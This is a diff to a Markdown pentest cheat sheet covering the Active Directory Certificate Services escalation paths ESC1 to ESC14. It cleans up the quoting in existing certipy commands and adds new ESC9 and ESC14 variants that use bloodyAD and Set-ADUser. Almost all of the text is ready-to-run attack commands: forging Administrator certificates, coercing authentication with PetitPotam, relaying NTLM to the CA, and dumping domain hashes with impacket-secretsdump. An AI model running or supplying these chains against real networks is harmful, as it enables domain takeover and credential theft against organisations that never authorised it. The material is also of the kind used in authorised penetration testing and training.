@@ -4362,77 +4362,77 @@ impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
 #### Active Directory Certificate Services (AD CS)
 
 ```shell
-certipy-ad find -username <USERNAME>@<DOMAIN> -password <PASSWORD> -dc-ip <RHOST> -vulnerable -stdout
+certipy-ad find -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -dc-ip <RHOST> -vulnerable -stdout
 ```
 
 ##### ESC1: Misconfigured Certificate Templates
 
 ```shell
-certipy-ad req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template <TEMPLATE> -upn administrator@<DOMAIN> -dns <RHOST>
-certipy-ad auth -pfx administrator.pfx -dc-ip <RHOST>
+certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -target '<CA>' -template '<TEMPLATE>' -upn 'Administrator@<DOMAIN>' -dns <RHOST>
+certipy-ad auth -pfx Administrator.pfx -dc-ip <RHOST>
 ```
 
 ##### ESC2: Misconfigured Certificate Templates
 
 ```shell
-certipy-ad req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template <TEMPLATE>
-certipy-ad req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template User -on-behalf-of '<DOMAIN>\Administrator' -pfx <USERNAME>.pfx
-certipy-ad auth -pfx administrator.pfx -dc-ip <RHOST>
+certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -target '<CA>' -template '<TEMPLATE>'
+certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -target '<CA>' -template User -on-behalf-of '<DOMAIN>\Administrator' -pfx <USERNAME>.pfx
+certipy-ad auth -pfx Administrator.pfx -dc-ip <RHOST>
 ```
 
 ##### ESC3: Enrollment Agent Templates
 
 ```shell
-certipy-ad req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template <TEMPLATE>
-certipy-ad req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template User -on-behalf-of '<DOMAIN>\Administrator' -pfx <USERNAME>.pfx
-certipy-ad auth -pfx administrator.pfx -dc-ip <RHOST>
+certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -target '<CA>' -template '<TEMPLATE>'
+certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -target '<CA>' -template User -on-behalf-of '<DOMAIN>\Administrator' -pfx <USERNAME>.pfx
+certipy-ad auth -pfx Administrator.pfx -dc-ip <RHOST>
 ```
 
 ##### ESC4: Vulnerable Certificate Template Access Control
 
 ```shell
-certipy-ad template -username <USERNAME>@<DOMAIN> -password <PASSWORD> -template <TEMPLAET> -save-old
-certipy-ad req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <RHOST> -template <TEMPLATE> -upn administrator@<DOMAIN>
-certipy-ad auth -pfx administrator.pfx -dc-ip <RHOST>
+certipy-ad template -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -template '<TEMPLATE>' -save-old
+certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -target <RHOST> -template '<TEMPLATE>' -upn 'Administrator@<DOMAIN>'
+$ certipy-ad auth -pfx Administrator.pfx -dc-ip <RHOST>
 ```
 
 or
 
 ```shell
-certipy-ad template -username <USERNAME>@<DOMAIN> -password <PASSWORD> -template <TEMPLAET> -save-old
-certipy-ad req -ca '<CA>' -dc-ip <RHOST> -u <USERNAME> -p '<PASSWORD>' -template <TEMPLATE> -target <RHOST> -upn administrator@<DOMAIN> -debug
-certipy-ad auth -pfx administrator.pfx -dc-ip <RHOST>
+certipy-ad template -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -template '<TEMPLATE>' -save-old
+certipy-ad req -ca '<CA>' -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <RHOST> -template '<TEMPLATE>' -target <RHOST> -upn 'Administrator@<DOMAIN>' -debug
+certipy-ad auth -pfx Administrator.pfx -dc-ip <RHOST>
 ```
 
 ##### ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2
 
 ```shell
-certipy-ad find -username <USERNAME>@<DOMAIN> -password <PASSWORD> -vulnerable -dc-ip <RHOST> -stdout
-certipy-ad req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template User -upn administrator@<DOMAIN>
-certipy-ad req -ca '<CA>' -username administrator@<DOMAIN> -password <PASSWORD> -target <CA> -template User -upn administrator@<DOMAIN>
-certipy-ad auth -pfx administrator.pfx -dc-ip <RHOST>
+certipy-ad find -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -dc-ip <RHOST> -vulnerable -stdout
+certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -target '<CA>' -template User -upn 'Administrator@<DOMAIN>'
+certipy-ad req -ca '<CA>' -username 'Administrator@<DOMAIN>' -password '<PASSWORD>' -target '<CA>' -template User -upn 'Administrator@<DOMAIN>'
+certipy-ad auth -pfx Administrator.pfx -dc-ip <RHOST>
 ```
 
 ##### ESC7: Vulnerable Certificate Authority Access Control
 
 ```shell
-certipy-ad ca -ca '<CA>' -add-officer <USERNAME> -username <USERNAME>@<DOMAIN> -password <PASSWORD>
-certipy-ad ca -ca '<CA>' -enable-template SubCA -username <USERNAME>@<DOMAIN> -password <PASSWORD>
-certipy-ad req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template SubCA -upn administrator@<DOMAIN>
-certipy-ad ca -ca '<CA>' -issue-request <ID> -username <USERNAME>@<DOMAIN> -password <PASSWORD>
-certipy-ad req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -retrieve <ID>
-certipy-ad auth -pfx administrator.pfx -dc-ip <RHOST>
+certipy-ad ca -ca '<CA>' -add-officer '<USERNAME>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>'
+certipy-ad ca -ca '<CA>' -enable-template SubCA -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>'
+certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -target '<CA>' -template SubCA -upn 'Administrator@<DOMAIN>'
+certipy-ad ca -ca '<CA>' -issue-request <ID> -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>'
+certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -target '<CA>' -retrieve <ID>
+certipy-ad auth -pfx Administrator.pfx -dc-ip <RHOST>
 ```
 
 ##### ESC8: NTLM Relay to AD CS HTTP Endpoints
 
 ```shell
-certipy relay -target 'http://<CA>'
-certipy relay -ca '<CA>' -template <TEMPLATE>
+certipy-ad relay -target 'http://<CA>'
+certipy-ad relay -ca '<CA>' -template '<TEMPLATE>'
 python3 PetitPotam.py <RHOST> <DOMAIN>
-certipy auth -pfx dc.pfx -dc-ip <RHOST>
+certipy-ad auth -pfx dc.pfx -dc-ip <RHOST>
 export KRB5CCNAME=dc.ccache
-impacket-secretsdump -k -no-pass <DOMAIN>/'dc$'@<DOMAIN>
+impacket-secretsdump -k -no-pass <DOMAIN>/<RHOST>@<DOMAIN>
 ```
 
 ###### Coercing
@@ -4440,29 +4440,55 @@ impacket-secretsdump -k -no-pass <DOMAIN>/'dc$'@<DOMAIN>
 ```shell
 impacket-ntlmrelayx -t http://<RHOST>/certsrv/certfnsh.asp -smb2support --adcs --template <TEMPLATE>
 python3 PetitPotam.py <RHOST> <DOMAIN>
-python3 gettgtpkinit.py -pfx-base64 $(cat base64.b64) '<DOMAIN>'/'dc$' 'dc.ccache'
+python3 gettgtpkinit.py -pfx-base64 $(cat base64.b64) '<DOMAIN>'/'<RHOST>' 'dc.ccache'
 export KRB5CCNAME=dc.ccache
-impacket-secretsdump -k -no-pass <DOMAIN>/'dc$'@<DOMAIN>
+impacket-secretsdump -k -no-pass <DOMAIN>/<RHOST>@<DOMAIN>
 ```
 
 ##### ESC9: No Security Extensions
 
 ```shell
-certipy-ad shadow auto -username <USERNAME>@<DOMAIN> -password <PASSWORD> -account <USERNAME>
-certipy-ad account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME> -upn Administrator
-certipy-ad req -ca '<CA>' -username <USERNAME> -hashes 54296a48cd30259cc88095373cec24da -template <TEMPLATE>
-certipy-ad account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME> -upn <USERNAME>@<DOMAIN>
-certipy-ad auth -pfx administrator.pfx -domain <DOMAIN>
+certipy-ad shadow auto -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -account '<USERNAME>'
+certipy-ad account update -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -user '<USERNAME>' -upn 'Administrator@<DOMAIN>'
+certipy-ad req -ca '<CA>' -username '<USERNAME>' -hashes '<HASH>' -template '<TEMPLATE>'
+certipy-ad account update -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -user '<USERNAME>' -upn '<USERNAME>@<DOMAIN>'
+certipy-ad auth -pfx Administrator.pfx -domain '<DOMAIN>'
 ```
 
 or
 
 ```shell
-certipy-ad shadow auto -username <USERNAME>@<DOMAIN> -password <PASSWORD> -account <USERNAME>
-certipy-ad account update -username <USERNAME>@<DOMAIN> -hashes <HASH> -user <USERNAME> -upn Administrator
-certipy-ad req -ca '<CA>' -username <USERNAME> -password '<PASSWORD>' -template <TEMPLATE>
-certipy-ad account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME> -upn <USERNAME>@<DOMAIN>
-certipy-ad auth -pfx administrator.pfx -domain <DOMAIN>
+certipy-ad shadow auto -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -account '<USERNAME>'
+certipy-ad account update -username '<USERNAME>@<DOMAIN>' -hashes '<HASH>' -user '<USERNAME>' -upn 'Administrator@<DOMAIN>'
+certipy-ad req -ca '<CA>' -username '<USERNAME>' -password '<PASSWORD>' -template '<TEMPLATE>'
+certipy-ad account update -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -user '<USERNAME>' -upn '<USERNAME>@<DOMAIN>'
+certipy-ad auth -pfx Administrator.pfx -domain '<DOMAIN>'
+```
+
+###### Alternative via Computer Object and Email
+
+```shell
+bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add computer '<USERNAME>' '<PASSWORD>'
+```
+
+```shell
+certipy-ad account update -username '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -user '<USERNAME>' -upn '<USERNAME>@<DOMAIN>'
+```
+
+```shell
+bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add genericAll 'OU=<OU>,DC=<DOMAIN>,DC=<DOMAIN>' '<USERNAME>'
+```
+
+```shell
+bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> set object <USERNAME> mail -v <EMAIL>
+```
+
+```shell
+certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -hashes '<HASH>' -template '<TEMPLATE>'
+```
+
+```shell
+certipy-ad auth -pfx <FILE>.pfx -domain '<DOMAIN>' -username '<USERNAME>@<DOMAIN>'
 ```
 
 ##### ESC10: Weak Certificate Mappings
@@ -4470,28 +4496,52 @@ certipy-ad auth -pfx administrator.pfx -domain <DOMAIN>
 ###### Case 1
 
 ```shell
-certipy-ad shadow auto -username <USERNAME>@<DOMAIN> -password <PASSWORD> -account <USERNAME>
-certipy-ad account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME> -upn Administrator
-certipy-ad req -ca '<CA>' -username <USERNAME>@<DOMAIN> -hashes a87f3a337d73085c45f9416be5787d86
-certipy-ad account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME -upn <USERNAME>@<DOMAIN>
-certipy-ad auth -pfx administrator.pfx -domain <DOMAIN>
+certipy-ad shadow auto -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -account '<USERNAME>'
+certipy-ad account update -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -user '<USERNAME>' -upn 'Administrator@<DOMAIN>'
+certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -hashes '<HASH>'
+certipy-ad account update -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -user '<USERNAME>' -upn '<USERNAME>@<DOMAIN>'
+certipy-ad auth -pfx Administrator.pfx -domain '<DOMAIN>'
 ```
 
 ###### Case 2
 
 ```shell
-certipy-ad shadow auto -username <USERNAME>@<DOMAIN> -password <PASSWORD> -account <USERNAME>
-certipy-ad account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME> -upn 'DC$@<DOMAIN>'
-certipy-ad req -ca 'CA' -username <USERNAME>@<DOMAIN> -password -hashes a87f3a337d73085c45f9416be5787d86
-certipy-ad account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME -upn <USERNAME>@<DOMAIN>
-certipy-ad auth -pfx dc.pfx -dc-ip <RHOST> -ldap-shell
+certipy-ad shadow auto -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -account '<USERNAME>'
+certipy-ad account update -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -user '<USERNAME>' -upn '<RHOST>@<DOMAIN>'
+certipy-ad req -ca 'CA' -username '<USERNAME>@<DOMAIN>' -password -hashes '<HASH>'
+certipy-ad account update -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -user '<USERNAME>' -upn '<USERNAME>@<DOMAIN>'
+certipy-ad auth -pfx dc.pfx -dc-ip '<RHOST>' -ldap-shell
 ```
 
 ##### ESC11: IF_ENFORCEENCRYPTICERTREQUEST
 
 ```shell
 certipy-ad relay -target 'rpc://<CA>' -ca 'CA'
-certipy-ad auth -pfx administrator.pfx -domain <DOMAIN>
+certipy-ad auth -pfx administrator.pfx -domain '<DOMAIN>'
+```
+
+##### ESC14: altSecurityIdentities
+
+###### ESC14 Scenario B: Target with X509RFC822 (email)
+
+```shell
+python3 entry.py find -u '<USERNAME>@<DOMAIN>' -hashes ':<HASH>' -dc-ip <RHOST> -esc14 -vulnerable -stdout -debug
+```
+
+```cmd
+Set-ADUser -Identity <USERNAME> -Add @{'altSecurityIdentities'='X509:<RFC822>foobar@domain.local'}
+```
+
+```shell
+bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> set object <USERNAME> mail -v foobar@domain.local
+```
+
+```shell
+certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -hashes '<HASH>' -template '<TEMPLATE>'
+```
+
+```shell
+certipy-ad auth -pfx <FILE>.pfx -domain '<DOMAIN>' -username '<USERNAME>'
 ```
 
 #### ADCSTemplate
